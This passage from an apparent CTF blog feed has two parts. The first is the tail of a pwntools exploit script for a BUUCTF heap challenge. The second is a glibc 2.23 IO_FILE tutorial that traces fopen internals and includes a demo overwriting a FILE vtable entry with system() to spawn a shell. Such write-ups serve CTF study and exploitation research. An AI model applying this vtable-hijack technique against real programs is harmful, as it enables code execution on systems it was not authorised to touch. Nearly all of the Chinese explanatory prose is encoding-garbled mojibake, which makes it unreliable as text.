process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29350</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;which command?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">choice, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">    sa(<span class="string">&quot;your inode number:&quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    ru(<span class="string">&quot;what do you want to say at last?&quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">show_type</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(show_type))</span><br><span class="line">    <span class="keyword">if</span> show_type == <span class="number">1</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> show_type == <span class="number">2</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./ciscn_final&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16_2</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILEç›¸å…³åˆ©ç”¨</title>
      <link href="2021/07/27/IO-FILE/"/>
      <url>2021/07/27/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>æ€»ç»“è‡ªctfwiki</p><h2 id="IO-FILEç›¸å…³çŸ¥è¯†"><a href="#IO-FILEç›¸å…³çŸ¥è¯†" class="headerlink" title="IO_FILEç›¸å…³çŸ¥è¯†"></a>IO_FILEç›¸å…³çŸ¥è¯†</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>_IO_list_allæ˜¯_IO_FILE_plusç±»å‹çš„ä¸€ä¸ªæŒ‡é’ˆ<br><code>extern struct _IO_FILE_plus *_IO_list_all</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ç¬¬ä¸€éƒ¨åˆ†ï¼Œ file åœ¨ Linux ç³»ç»Ÿçš„æ ‡å‡† IO åº“ä¸­æ˜¯ç”¨äºæè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚fileç»“æ„åœ¨ç¨‹åºæ‰§è¡Œï¼Œfreadã€fwrite ç­‰æ ‡å‡†å‡½æ•°éœ€è¦æ–‡ä»¶æµæŒ‡é’ˆæ¥æŒ‡å¼•å»è°ƒç”¨è™šè¡¨å‡½æ•°ã€‚ç‰¹æ®Šåœ°ï¼Œ fopen ç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ã€‚æˆ‘ä»¬å¸¸å®šä¹‰ä¸€ä¸ªæŒ‡å‘ fileç»“æ„çš„æŒ‡é’ˆæ¥æ¥æ”¶è¿™ä¸ªè¿”å›å€¼ã€‚</p><p>åœ¨ç¬¬äºŒéƒ¨åˆ†ï¼Œåˆšåˆšè°ˆåˆ°çš„è™šè¡¨å°±æ˜¯ _IO_jump_t ç»“æ„ä½“ï¼Œåœ¨æ­¤è™šè¡¨ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°éƒ½è°ƒç”¨å…¶ä¸­çš„å­å‡½æ•°ï¼Œæ— è®ºæ˜¯å…³é—­æ–‡ä»¶ï¼Œè¿˜æ˜¯æŠ¥é”™è¾“å‡ºç­‰ç­‰ï¼Œéƒ½æœ‰å¯¹åº”çš„å­—æ®µï¼Œè€Œè¿™æ­£æ˜¯å¯ä»¥æ”»å‡»è€…å¯ä»¥è¢«åˆ©ç”¨çš„çªç ´å£ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ _IO_list_all ç»“æ„ä½“ä¸­ï¼Œ_IO_FILE ç»“æ„æ˜¯å®Œæ•´åµŒå…¥å…¶ä¸­ï¼Œè€Œ vtable æ˜¯ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘äº† _IO_jump_t ç»“æ„ä½“ã€‚ä¸€ä¸ªæ˜¯å®Œæ•´çš„ï¼Œä¸€ä¸ªæ˜¯æŒ‡é’ˆï¼Œè¿™ç‚¹ä¸€å®šè¦åˆ‡è®°ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å€Ÿç”¨ä¹‹å‰æ€»ç»“çš„<br><img src="https://l3mon629.github.io/post-images/1600588419695.png" alt=""></p><h3 id="æºç è°ƒè¯•"><a href="#æºç è°ƒè¯•" class="headerlink" title="æºç è°ƒè¯•"></a>æºç è°ƒè¯•</h3><p>å¬æ˜Ÿç›Ÿå¸ˆå‚…è®²çš„å…¬å¼€è¯¾ï¼Œæ¨èäº†raycpå¸ˆå‚…çš„åšå®¢ï¼ŒIOFILEè¿™ä¸€éƒ¨åˆ†æ ¹æ®å¸ˆå‚…çš„åšå®¢æ¥å¤ç°æ€»ç»“ä¸€ä¸‹</p><p>é‡‡å–libc versionä¸º2.23</p><p>ä»¥fopenä¸ºä¾‹åˆ†æä¸€ä¸ªfileå‡½æ•°çš„æ‰§è¡Œæµç¨‹</p><h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopenå®é™…ä¸Šæ˜¯_IO_new_fopenå‡½æ•°</p><p>å®šä¹‰ä½ç½®ä¸º/libio/iofopen.cçš„34è¡Œ</p><p><code>define _IO_new_fopen fopen</code></p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¥å…¥åˆ°__fopen_internalå‡½æ•° æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line">  <span class="comment">// åˆ†é…ä¸€å—sizeof(struct locked_FILE)å¤§å°çš„ç©ºé—´æ¥è£…ç»“æ„ä½“</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–æ“ä½œ</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¸ˆå‚…çš„æ€»ç»“å¦‚ä¸‹</p><blockquote><p>æ•´ä¸ª<code>__fopen_internal</code>å‡½æ•°åŒ…å«å››ä¸ªéƒ¨åˆ†ï¼š</p><ol><li><code>malloc</code>åˆ†é…å†…å­˜ç©ºé—´ã€‚</li><li><code>_IO_no_init</code> å¯¹fileç»“æ„ä½“è¿›è¡Œ<code>null</code>åˆå§‹åŒ–ã€‚</li><li><code>_IO_file_init</code>å°†ç»“æ„ä½“é“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨ã€‚</li><li><code>_IO_file_fopen</code>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶ã€‚</li></ol></blockquote><h5 id="åˆ†é…å†…å­˜ç©ºé—´"><a href="#åˆ†é…å†…å­˜ç©ºé—´" class="headerlink" title="åˆ†é…å†…å­˜ç©ºé—´"></a>åˆ†é…å†…å­˜ç©ºé—´</h5><p>é¦–å…ˆåˆ†é…äº†ä¸€å—å†…å­˜ç©ºé—´æ¥è£…locked_FILEç»“æ„ä½“</p><p>ç»“æ„ä½“æˆå‘˜ä¸º_IO_FILE_plusï¼Œ_IO_lock_tå’Œ_IO_wide_dataç±»å‹çš„å˜é‡</p><p><img src="https://i.loli.net/2021/08/02/L7F2VPznYpkWfy9.png" alt=""></p><h5 id="IO-no-initå¯¹ç»“æ„ä½“åˆå§‹åŒ–"><a href="#IO-no-initå¯¹ç»“æ„ä½“åˆå§‹åŒ–" class="headerlink" title="_IO_no_initå¯¹ç»“æ„ä½“åˆå§‹åŒ–"></a>_IO_no_initå¯¹ç»“æ„ä½“åˆå§‹åŒ–</h5><p><img src="https://i.loli.net/2021/08/02/YGiPwth9po17WS2.png" alt=""></p><p>åˆå§‹åŒ–æˆå‘˜fpï¼ˆ_IO_FILE_plusï¼‰çš„å€¼ï¼Œå¤§éƒ¨åˆ†éƒ½ä¸ºnull</p><h5 id="ç»“æ„ä½“é“¾å…¥-IO-list-all"><a href="#ç»“æ„ä½“é“¾å…¥-IO-list-all" class="headerlink" title="ç»“æ„ä½“é“¾å…¥_IO_list_all"></a>ç»“æ„ä½“é“¾å…¥_IO_list_all</h5><p>æ¥ä¸‹æ¥æ‰§è¡Œ_IO_file_initå‡½æ•°</p><p><img src="https://i.loli.net/2021/08/02/EAokLgltTYJQj7v.png" alt=""></p><p>é‡è¦çš„æ˜¯è°ƒç”¨äº†link inå‡½æ•°ï¼Œçœ‹åå­—å°±çŸ¥é“åº”è¯¥æ˜¯è¿™ä¸ªå‡½æ•°æ“ä½œäº†é“¾å…¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// æ”¹fpçš„chainé“¾</span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">    <span class="comment">// æ”¹_IO_list_all</span></span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹ä¹‹å‰ï¼š_IO_list_allæŒ‡å‘stderr</p><p><img src="https://i.loli.net/2021/08/02/fRN9FUO1ViJCPwA.png" alt=""></p><p>åšå®Œlink inæ“ä½œåï¼š_IO_list_allæŒ‡å‘fpï¼Œfp._chainæŒ‡å‘stderr</p><p><img src="https://i.loli.net/2021/08/02/fpmKdFRYo6VeTh5.png" alt=""></p><h5 id="IO-file-fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„"><a href="#IO-file-fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„" class="headerlink" title="_IO_file_fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„"></a>_IO_file_fopenæ‰“å¼€æ–‡ä»¶å¥æŸ„</h5><p>é¦–å…ˆä¼šè¿›å…¥_IO_new_file_fopenå‡½æ•°</p><p><img src="https://i.loli.net/2021/08/02/cQstGUBLpAwv6hZ.png" alt="6.png"></p><p>è®¾ç½®æ–‡ä»¶çš„æ¨¡å¼ä¹‹ç±»çš„æ“ä½œ</p><p>éšåè°ƒç”¨_IO_file_fopenå‡½æ•°</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>_IO_file_fopenå‡½æ•°ä¸»è¦æ˜¯è°ƒç”¨äº†openç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶ä¸”å°†æ–‡ä»¶æè¿°ç¬¦è¿”å›ç»™fdçš„filenoå­—æ®µ</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>æ‰§è¡Œå®Œå‡½æ•°ï¼Œè§‚å¯Ÿfilenoå­—æ®µå·²è¢«å¡«å…¥æ­£ç¡®çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶æ­£å¸¸æ‰“å¼€</p><p><img src="https://i.loli.net/2021/08/02/lYn69xwXPWiMbVK.png" alt=""></p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>fopené¦–å…ˆç”³è¯·å†…å­˜ï¼Œåˆå§‹åŒ–ç»“æ„ä½“ï¼Œç„¶åé“¾å…¥é“¾è¡¨ï¼Œæœ€åè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</p><h2 id="ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹"><a href="#ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹" class="headerlink" title="ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹"></a>ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹</h2><p>ç”±äºlinuxä¸­ä¸€äº›å¸¸è§çš„IOæ“ä½œå‡½æ•°éƒ½éœ€è¦ç»è¿‡FILEç»“æ„å¤„ç†ï¼Œå°¤å…¶æ˜¯_IO_FILE_plusç»“æ„ä¸­å­˜åœ¨vtableï¼Œä¸€äº›å‡½æ•°ä¼šå»é™¤vtableä¸­çš„æŒ‡é’ˆè¿›è¡Œè°ƒç”¨ã€‚<br>ä¼ªé€ vtableåŠ«æŒç¨‹åºçš„ä¸­å¿ƒæ€æƒ³å°±æ˜¯é’ˆå¯¹_IO_FILE_plusçš„vtableåŠ¨æ‰‹è„šï¼Œé€šè¿‡æŠŠvtableæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆæ¥å®ç°ï¼Œè¦†ç›–vtableçš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œç„¶ååœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆ(åæ­£å°±æ˜¯æ§åˆ¶æŒ‡é’ˆå°±å®Œäº†å—·)</p><p>çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å†…å­˜åˆ†å¸ƒ</p><p><img src="https://i.loli.net/2021/08/02/9m2r1GLTNScKxEJ.png" alt=""></p><p>æ‰¾åˆ°vtableçš„åç§»ç„¶åæ”¹æ‰æˆ‘ä»¬æ§åˆ¶çš„ä¸€ç‰‡å†…å­˜ç©ºé—´ï¼Œå†åœ¨å†…å­˜ç©ºé—´é‡Œç›¸åº”ä½ç½®çš„åœ°æ–¹æ”¹æˆsystemä¹‹ç±»çš„å‡½æ•°å³å¯æ§åˆ¶ç¨‹åºæµ</p><p><img src="https://i.loli.net/2021/08/02/uWgdeUJlqL9kAc1.png" alt=""></p><h3 id="vtableå‡½æ•°çš„è°ƒç”¨æƒ…å†µ"><a href="#vtableå‡½æ•°çš„è°ƒç”¨æƒ…å†µ" class="headerlink" title="vtableå‡½æ•°çš„è°ƒç”¨æƒ…å†µ"></a>vtableå‡½æ•°çš„è°ƒç”¨æƒ…å†µ</h3><p>è°ƒç”¨æƒ…å†µå¦‚ä¸‹ï¼š</p><blockquote><p>fopenå‡½æ•°æ˜¯åœ¨åˆ†é…ç©ºé—´ï¼Œå»ºç«‹FILEç»“æ„ä½“ï¼Œæœªè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</p><p>freadå‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_sgetn</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_xsgetn</code>ã€‚</li><li><code>_IO_doallocbuf</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>__underflow</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_underflow</code>å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_underflow</code>è°ƒç”¨äº†vtable<code>__GI__IO_file_read</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</li></ul><p>fwrite å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_fwrite</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_new_file_xsputn</code>ã€‚</li><li><code>_IO_new_file_xsputn</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_overflow</code>å®ç°ç¼“å†²åŒºçš„å»ºç«‹ä»¥åŠåˆ·æ–°ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_overflow</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>new_do_write</code>ä¸­çš„<code>_IO_SYSWRITE</code>è°ƒç”¨äº†vtable<code>_IO_new_file_write</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeã€‚</li></ul><p><code>fclose</code>å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li>åœ¨æ¸…ç©ºç¼“å†²åŒºçš„<code>_IO_do_write</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</li><li>å…³é—­æ–‡ä»¶æè¿°ç¬¦<code>_IO_SYSCLOSE</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__close</code>å‡½æ•°ã€‚</li><li><code>_IO_FINISH</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__finish</code>å‡½æ•°ã€‚</li></ul></blockquote><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP = File Stream Oriented 